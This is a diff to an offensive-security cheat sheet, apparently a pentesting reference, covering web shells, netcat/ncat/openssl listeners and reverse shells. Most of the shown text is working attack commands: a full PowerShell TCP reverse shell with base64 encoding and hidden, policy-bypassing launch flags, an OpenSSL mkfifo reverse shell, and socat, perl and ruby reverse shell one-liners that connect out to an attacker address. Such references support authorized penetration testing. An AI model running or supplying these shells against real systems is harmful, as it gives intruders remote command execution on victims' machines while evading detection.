@@ -96,7 +96,7 @@ parameters:
 
 ###### SecurityRiskAdvisors'
 
-The SecurityRiskAdvisors' `cmd.jsp` web shell provides command execution and
+The `SecurityRiskAdvisors`' `cmd.jsp` web shell provides command execution and
 file upload capability while being as small and widely compatible as possible.
 
 Once uploaded on the target system, load the following `JavaScript` code
@@ -195,7 +195,7 @@ Options: /c <COMMAND>
 
 #### Listener on host
 
-###### Netcat
+###### [Linux / Windows] Basic listeners
 
 ```
 # TCP
@@ -204,8 +204,11 @@ nc -lvnp <PORT>
 # UDP
 nc -lvnpu <PORT>
 
-# ICMP
-python icmpsh_m.py <HOST_IP> <TARGET_IP>
+# With SSL / TLS support
+ncat --ssl -vv -l -p <PORT>
+
+openssl req -x509 -newkey rsa:4096 -keyout tmpkey.pem -out tmpcert.pem -days 365 -nodes
+openssl s_server -quiet -key tmpkey.pem -cert tmpcert.pem -port <PORT>
 ```
 
 ###### [Windows] PowerCat
@@ -213,6 +216,12 @@ python icmpsh_m.py <HOST_IP> <TARGET_IP>
 ```
 powercat -l -p 443 -ep
 powercat -l -p 443 -e <BINARY>
+```
+
+###### [Linux / Windows] Python ICMP
+
+```
+python icmpsh_m.py <HOST_IP> <TARGET_IP>
 ```
 
 #### One-liners reverse shell
@@ -254,7 +263,26 @@ socat tcp-connect:<IP>:<PORT> exec:"sh -li",pty,stderr,setsid,sigint,sane
 socat tcp-connect:<IP>:<PORT> exec:"/bin/sh -li",pty,stderr,setsid,sigint,sane
 ```
 
-###### [Windows] PowerCat
+###### [Windows] PowerShell
+
+*Standalone one-liner*
+
+Starting PowerShell with the straight reverse shell command, `powershell -c
+<COMMAND>`, may results in error. Encoding and executing the command in
+`base64` oftentimes proves to be more successful.
+
+```
+# Can be executed on attacking system
+$cmd = '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+$EncodedCmd =[Convert]::ToBase64String($Bytes)
+$EncodedCmd
+
+powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD>
+```
+
+*PowerCat*
 
 `powercat` is a PowerShell function, for Powershell Version 2 and later,
 providing the same functionalities as `netcat`.
@@ -316,6 +344,14 @@ perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 
 ```ruby
 ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+###### OpenSSL
+
+Requires a listener that supports `SSL` / `TLS` connections.
+
+```
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/s; rm /tmp/s
 ```
 
 #### Complete reverse shell scripts
